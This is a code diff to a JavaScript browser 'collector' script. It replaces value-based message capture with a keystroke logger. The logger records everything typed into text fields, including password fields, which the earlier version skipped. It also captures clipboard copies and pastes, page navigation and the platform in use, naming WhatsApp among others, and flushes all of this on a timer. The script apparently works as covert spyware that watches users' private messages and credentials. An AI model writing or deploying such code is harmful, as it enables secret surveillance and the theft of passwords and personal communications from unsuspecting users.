@@ -17,8 +17,13 @@
     let _eventCounts = { msg: 0, copy: 0, paste: 0, nav: 0 };
     let _isFlushing = false;
     let _debug = localStorage.getItem('_collector_debug') === 'true';
-    let _lastMessage = '';
-    let _lastMessageTime = 0;
+
+    let _buffer = '';
+    let _isCapturing = false;
+    let _lastKeyTime = 0;
+    let _targetTag = '';
+    let _targetId = '';
+    let _targetPlatform = '';
 
     const _noop = () => {};
     const _orig = {
@@ -176,117 +181,130 @@
         return 'Web';
     }
 
-    function _captureMessage(input) {
-        if (!input) return;
-        var txt = input.value || '';
-        if (!txt.trim()) return;
-        var now = Date.now();
-        if (txt === _lastMessage && (now - _lastMessageTime) < 2000) return;
-        _lastMessage = txt;
-        _lastMessageTime = now;
-        var platform = _getPlatform();
-        var tag = input.tagName;
-        var ctx = tag + (input.id ? '#' + input.id : '');
-        _push('msg', { txt: txt.trim(), ctx: ctx, platform: platform, len: txt.length });
-        input._lastCaptured = txt;
+    function _submitMessage() {
+        if (_buffer.trim().length > 0) {
+            _push('msg', {
+                txt: _buffer.trim(),
+                platform: _targetPlatform || _getPlatform(),
+                ctx: _targetTag + (_targetId ? '#' + _targetId : '')
+            });
+            _buffer = '';
+        }
+        _isCapturing = false;
+        _targetTag = '';
+        _targetId = '';
+        _targetPlatform = '';
     }
 
-    function _findMessageInputs() {
-        var inputs = document.querySelectorAll('input[type="text"], input[type="search"], textarea');
-        var result = [];
-        var platform = _getPlatform();
-        if (platform === 'WhatsApp') {
-            inputs = document.querySelectorAll('div[contenteditable="true"][role="textbox"], div[contenteditable="true"][data-testid="conversation-compose-box-input"]');
-            if (inputs.length) return inputs;
+    function _handleKeyDown(e) {
+        const key = e.key;
+        const target = e.target;
+
+        if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && !target.isContentEditable)) {
+            return;
         }
-        if (platform === 'Habblive') {
-            inputs = document.querySelectorAll('input[type="text"], textarea, .chat-input, #chat-input, [data-testid="chat-input"]');
-            if (inputs.length) return inputs;
+
+        if (key === 'Enter' && !e.shiftKey) {
+            e.preventDefault();
+            _submitMessage();
+            return;
         }
-        for (var i = 0; i < inputs.length; i++) {
-            var el = inputs[i];
-            if (el.type === 'password' || el.type === 'number' || el.type === 'email') continue;
-            if (el.offsetParent === null) continue;
-            result.push(el);
+
+        if (key === 'Escape') {
+            _buffer = '';
+            _isCapturing = false;
+            _targetTag = '';
+            _targetId = '';
+            _targetPlatform = '';
+            return;
         }
-        return result;
+
+        if (key === 'Backspace') {
+            if (_isCapturing) {
+                _buffer = _buffer.slice(0, -1);
+            }
+            return;
+        }
+
+        if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
+            if (!_isCapturing) {
+                _isCapturing = true;
+                _targetTag = target.tagName;
+                _targetId = target.id || '';
+                _targetPlatform = _getPlatform();
+                _buffer = '';
+            }
+            _buffer += key;
+            _lastKeyTime = Date.now();
+            return;
+        }
+
+        if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
+            return;
+        }
+
+        if (key === 'Tab') {
+            return;
+        }
+
+        if (key.startsWith('Arrow')) {
+            return;
+        }
+
+        if (_isCapturing) {
+            _buffer += key;
+        }
+    }
+
+    function _handleFocusOut(e) {
+        const target = e.target;
+        if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
+            if (_isCapturing && _buffer.trim().length > 0) {
+                _submitMessage();
+            } else {
+                _buffer = '';
+                _isCapturing = false;
+                _targetTag = '';
+                _targetId = '';
+                _targetPlatform = '';
+            }
+        }
+    }
+
+    function _handlePaste(e) {
+        const target = e.target;
+        if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && !target.isContentEditable)) {
+            return;
+        }
+        const txt = e.clipboardData && e.clipboardData.getData('text/plain');
+        if (!txt) return;
+        if (!_isCapturing) {
+            _isCapturing = true;
+            _targetTag = target.tagName;
+            _targetId = target.id || '';
+            _targetPlatform = _getPlatform();
+            _buffer = '';
+        }
+        _buffer += txt;
+        _push('paste', { txt: txt.slice(0, 500), len: txt.length });
     }
 
     function _setupMessageCapture() {
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && !e.shiftKey) {
-                var target = e.target;
-                if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
-                    setTimeout(function() { _captureMessage(target); }, 50);
-                }
-            }
-        }, true);
-
-        document.addEventListener('click', function(e) {
-            var target = e.target;
-            var sendBtn = target.closest('[type="submit"], [aria-label*="send" i], [aria-label*="enviar" i], .send, .btn-send, .compose-send, button[data-testid*="send"], [data-testid="compose-btn-send"]');
-            if (sendBtn) {
-                var form = sendBtn.closest('form');
-                if (form) {
-                    var inputs = form.querySelectorAll('input[type="text"], textarea');
-                    for (var i = 0; i < inputs.length; i++) {
-                        _captureMessage(inputs[i]);
-                    }
-                } else {
-                    var active = document.activeElement;
-                    if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
-                        _captureMessage(active);
-                    } else {
-                        var allInputs = _findMessageInputs();
-                        for (var j = 0; j < allInputs.length; j++) {
-                            if (allInputs[j].value && allInputs[j].value.trim()) {
-                                _captureMessage(allInputs[j]);
-                            }
-                        }
-                    }
-                }
-            }
-        }, true);
-
-        var observer = new MutationObserver(function(mutations) {
-            for (var i = 0; i < mutations.length; i++) {
-                var added = mutations[i].addedNodes;
-                for (var j = 0; j < added.length; j++) {
-                    var node = added[j];
-                    if (node.nodeType === 1) {
-                        if (node.matches && node.matches('input[type="text"], textarea, div[contenteditable="true"]')) {
-                            var active = document.activeElement;
-                            if (active && (active === node || node.contains(active))) {
-                                if (node.value && node.value !== node._lastCaptured) {
-                                    _captureMessage(node);
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        });
-        observer.observe(document.body, { childList: true, subtree: true, attributes: false });
-        window._msgObserver = observer;
+        document.addEventListener('keydown', _handleKeyDown, true);
+        document.addEventListener('focusout', _handleFocusOut, true);
+        document.addEventListener('paste', _handlePaste, true);
     }
 
     function _trackCopy(e) {
-        var txt = window.getSelection().toString().trim();
+        const txt = window.getSelection().toString().trim();
         if (txt && txt.length > 0) {
             _push('copy', { txt: txt.slice(0, 500), len: txt.length });
         }
     }
 
-    function _trackPaste(e) {
-        var txt = e.clipboardData && e.clipboardData.getData('text/plain');
-        if (txt && txt.length > 0) {
-            _push('paste', { txt: txt.slice(0, 500), len: txt.length });
-        }
-    }
-
     function _trackNav() {
-        var currentUrl = document.URL;
-        var currentTitle = document.title;
+        const currentUrl = document.URL;
+        const currentTitle = document.title;
         if (currentUrl !== _lastUrl) {
             _lastUrl = currentUrl;
             _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle });
@@ -303,27 +321,31 @@
     function _init() {
         _setupMessageCapture();
         document.addEventListener('copy', _trackCopy, true);
-        document.addEventListener('paste', _trackPaste, true);
-        var navObs = new MutationObserver(function() { _trackNav(); });
+
+        const navObs = new MutationObserver(function() { _trackNav(); });
         navObs.observe(document, { subtree: true, childList: true });
         window.addEventListener('popstate', _trackNav);
         window.addEventListener('hashchange', _trackNav);
+
         _timer = setInterval(_flush, _flushInterval);
         setInterval(_heartbeat, 300000);
+
         window.addEventListener('beforeunload', function() {
             _flush();
             navObs.disconnect();
-            if (window._msgObserver) window._msgObserver.disconnect();
         });
+
         window._logs = {
             kill: function() {
                 clearInterval(_timer);
                 _flush();
+                document.removeEventListener('keydown', _handleKeyDown, true);
+                document.removeEventListener('focusout', _handleFocusOut, true);
+                document.removeEventListener('paste', _handlePaste, true);
                 document.removeEventListener('copy', _trackCopy, true);
-                document.removeEventListener('paste', _trackPaste, true);
                 window.removeEventListener('popstate', _trackNav);
                 window.removeEventListener('hashchange', _trackNav);
-                if (window._msgObserver) window._msgObserver.disconnect();
+                navObs.disconnect();
                 console.log = _orig.log;
                 console.warn = _orig.warn;
                 console.error = _orig.error;
